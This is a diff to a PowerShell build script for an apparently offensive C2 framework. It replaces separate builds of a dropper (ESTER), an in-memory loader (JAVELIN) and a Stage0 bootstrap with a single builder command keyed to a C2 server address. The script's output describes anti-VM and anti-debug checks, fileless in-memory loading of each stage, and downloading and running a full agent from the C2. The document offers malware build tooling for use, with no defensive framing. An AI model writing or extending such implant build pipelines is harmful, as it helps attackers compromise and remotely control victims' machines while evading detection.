@@ -299,67 +299,62 @@ Write-Host ""
 # ============================================================================
 if ($MultiStage) {
     Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
-    Write-Color "📦 [4/4] Compilando sistema multi-stage..." Yellow
+    Write-Color "📦 [4/4] Compilando sistema multi-stage con builder..." Yellow
     Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
     
-    Write-Color "⚙️  Compilando ESTER (Stage 1: Dropper)..." Cyan
-    cargo build --release --package ester --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
-        if ($_ -match "error|failed") {
+    Write-Color "⚙️  Usando C2R2 Builder para construir ESTER→JAVELIN→Stage0..." Cyan
+    
+    # Primero compilar el builder si no existe
+    if (-not (Test-Path "target\debug\builder.exe") -and -not (Test-Path "target\release\builder.exe")) {
+        Write-Color "⚙️  Compilando builder..." Cyan
+        cargo build --package builder 2>&1 | Out-Null
+    }
+    
+    # Usar el builder para construir el sistema multi-stage
+    $builderArgs = @(
+        "run",
+        "--package", "builder",
+        "--",
+        "build-staged",
+        "--server", "${ServerIP}:${ServerPort}",
+        "--output", "dist"
+    )
+    
+    if ($Production) {
+        $builderArgs += "--production"
+    }
+    
+    cargo @builderArgs 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed|Error") {
             Write-Color $_ Red
-        } elseif ($_ -match "warning") {
+        } elseif ($_ -match "warning|⚠️") {
             Write-Color $_ Yellow
-        } elseif ($_ -match "Compiling|Finished") {
+        } elseif ($_ -match "Compiling|Finished|✅|📦|🔧") {
             Write-Color $_ Cyan
+        } elseif ($_ -match "━━━") {
+            Write-Color $_ Blue
+        } else {
+            Write-Host $_
         }
     }
     
     if ($LASTEXITCODE -eq 0) {
-        Copy-Item "target\x86_64-pc-windows-gnu\release\ester.exe" "dist\ester.exe" -Force
-        Write-Color "✅ ESTER compilado: dist\ester.exe" Green
+        Write-Color "✅ Sistema multi-stage compilado exitosamente!" Green
+        Write-Host ""
+        Write-Color "📋 Stages generados:" Yellow
+        Write-Host "   • dist\ester.exe - Stage 1: Dropper/Validator (ejecuta todo el flujo)"
+        Write-Host ""
+        Write-Color "ℹ️  Flujo de ejecución:" Cyan
+        Write-Host "   1. ester.exe valida el entorno (anti-VM, anti-debug)"
+        Write-Host "   2. Descifra y carga JAVELIN en memoria (no toca disco)"
+        Write-Host "   3. JAVELIN descifra y carga Stage0 en memoria"
+        Write-Host "   4. Stage0 contacta C2 en ${ServerIP}:${ServerPort}"
+        Write-Host "   5. Descarga y ejecuta el agent completo desde el C2"
     } else {
-        Write-Color "⚠️  Error compilando ESTER" Yellow
+        Write-Color "❌ Error compilando sistema multi-stage" Red
+        Write-Color "ℹ️  Revisa los mensajes de error arriba" Yellow
     }
     
-    Write-Color "⚙️  Compilando JAVELIN (Stage 2: In-Memory Loader)..." Cyan
-    cargo build --release --package javelin --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
-        if ($_ -match "error|failed") {
-            Write-Color $_ Red
-        } elseif ($_ -match "warning") {
-            Write-Color $_ Yellow
-        } elseif ($_ -match "Compiling|Finished") {
-            Write-Color $_ Cyan
-        }
-    }
-    
-    if ($LASTEXITCODE -eq 0) {
-        Copy-Item "target\x86_64-pc-windows-gnu\release\javelin.exe" "dist\javelin.exe" -Force
-        Write-Color "✅ JAVELIN compilado: dist\javelin.exe" Green
-    } else {
-        Write-Color "⚠️  Error compilando JAVELIN" Yellow
-    }
-    
-    Write-Color "⚙️  Compilando Stage0 (Stage 3: Bootstrap)..." Cyan
-    cargo build --release --package stage0 --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
-        if ($_ -match "error|failed") {
-            Write-Color $_ Red
-        } elseif ($_ -match "warning") {
-            Write-Color $_ Yellow
-        } elseif ($_ -match "Compiling|Finished") {
-            Write-Color $_ Cyan
-        }
-    }
-    
-    if ($LASTEXITCODE -eq 0) {
-        Copy-Item "target\x86_64-pc-windows-gnu\release\stage0.exe" "dist\stage0.exe" -Force
-        Write-Color "✅ Stage0 compilado: dist\stage0.exe" Green
-    } else {
-        Write-Color "⚠️  Error compilando Stage0" Yellow
-    }
-    
-    Write-Host ""
-    Write-Color "ℹ️  Nota: Los stages tienen payloads placeholder" Cyan
-    Write-Color "   Requieren integración con builder para embeber payloads cifrados" Cyan
-    Write-Color "   Flujo: ESTER → JAVELIN (memoria) → Stage0 (memoria) → Agent completo" Cyan
     Write-Host ""
 }
 
